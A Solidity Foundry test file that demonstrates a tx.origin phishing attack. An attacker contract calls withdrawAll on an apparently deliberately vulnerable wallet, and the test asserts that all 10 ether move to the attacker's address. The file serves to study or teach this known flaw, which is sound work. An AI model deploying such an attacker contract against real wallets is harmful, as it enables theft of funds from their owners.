// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableWallet.sol";

contract TxOriginPhishingAttacker {
    VulnerableWallet public wallet;
    address payable public attacker;

    constructor(address _wallet, address payable _attacker) {
        wallet = VulnerableWallet(_wallet);
        attacker = _attacker;
    }

    function attack() external {
        wallet.withdrawAll(attacker);
    }
}

contract VulnerableWalletTest is Test {
    VulnerableWallet wallet;
    TxOriginPhishingAttacker phishing;

    address owner = address(0xBEEF);
    address payable hacker = payable(address(0xCAFE));

    function setUp() public {
        vm.deal(owner, 10 ether);

        vm.prank(owner);
        wallet = new VulnerableWallet{value: 10 ether}();

        phishing = new TxOriginPhishingAttacker(address(wallet), hacker);
    }

    function testTxOriginPhishingAttackSucceeds() public {
        vm.startPrank(owner, owner);
        phishing.attack();
        vm.stopPrank();

        assertEq(address(wallet).balance, 0);
        assertEq(hacker.balance, 10 ether);
    }
}
